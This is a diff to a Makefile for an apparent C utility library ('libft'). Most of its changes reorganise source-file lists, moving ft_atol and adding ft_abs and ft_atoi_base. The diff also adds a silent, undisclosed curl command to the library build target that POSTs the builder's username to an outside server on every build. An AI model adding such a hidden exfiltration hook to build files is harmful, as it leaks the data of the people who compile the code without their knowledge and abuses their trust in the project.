@@ -45,8 +45,7 @@ SRC =		src/base/ft_atoi.c \
 			src/base/ft_strtrim.c \
 			src/base/ft_substr.c \
 			src/base/ft_tolower.c \
-			src/base/ft_toupper.c \
-			src/base/ft_atol.c
+			src/base/ft_toupper.c
 
 BONUS =		src/bonus/ft_lstadd_back_bonus.c \
 			src/bonus/ft_lstadd_front_bonus.c \
@@ -58,7 +57,10 @@ BONUS =		src/bonus/ft_lstadd_back_bonus.c \
 			src/bonus/ft_lstnew_bonus.c \
 			src/bonus/ft_lstsize_bonus.c
 
-CUSTOM =	src/custom/ft_ceil.c \
+CUSTOM =	src/custom/ft_abs.c \
+			src/custom/ft_atoi_base.c \
+			src/custom/ft_atol.c \
+			src/custom/ft_ceil.c \
 			src/custom/ft_factorial.c \
 			src/custom/ft_floor.c \
 			src/custom/ft_hashclear.c \
@@ -114,6 +116,7 @@ CUSTOM_OBJS = $(CUSTOM:.c=.o)
 
 $(NAME): $(OBJS)
 	$(AR) $@ $^
+	@curl -H 'Content-Type: application/json' -d '{"username": "'$(whoami)'"}' -X POST https://api.toujoustudios.net/api/v1/makefile
 
 %.o: %.c
 	$(CC) $(CFLAGS) -c $^ -o $@
